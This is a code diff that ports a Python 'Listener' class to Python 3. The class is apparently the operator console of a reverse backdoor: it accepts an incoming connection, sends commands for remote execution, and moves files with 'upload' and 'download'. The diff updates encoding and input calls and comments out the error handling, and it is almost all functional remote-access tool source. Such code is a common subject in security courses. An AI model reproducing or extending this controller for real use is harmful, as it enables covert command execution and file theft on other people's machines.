@@ -16,14 +16,14 @@ class Listener:
         # TODO: implement loading animation with spinner (progress lib)
         print("[+] Waiting for incoming connection...")
         self.connection, address = listener_socket.accept()
-        print("[+] Connection established! Source: " + str(address))
+        print(f"[+] Connection established! Source: {address}.")
 
-    def reliable_send(self, data):
+    def reliable_send(self, data: str):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 json_data += self.connection.recv(1024)
@@ -49,20 +49,20 @@ class Listener:
 
     def run(self):
         while True:
-            command = raw_input(" >> ")
+            command = input(" >> ")
             command = command.split()
 
-            try:
-                if command[0] == "upload":
-                    file_content = self.read_file(command[1])
-                    command.append(file_content)
+            # try:
+            if command[0] == "upload":
+                file_content = self.read_file(command[1]).decode()
+                command.append(file_content)
 
-                result = self.execute_remotely(command)
+            result = self.execute_remotely(command)
 
-                if command[0] == "download" and "[-] Error " not in result:
-                    result = self.write_file(command[1], result)
-            except Exception:
-                result = "[-] Error has occurred during command execution."
+            if command[0] == "download" and "[-] Error " not in result:
+                result = self.write_file(command[1], result)
+            # except Exception:
+            # result = "[-] Error has occurred during command execution."
 
             print(result)
 
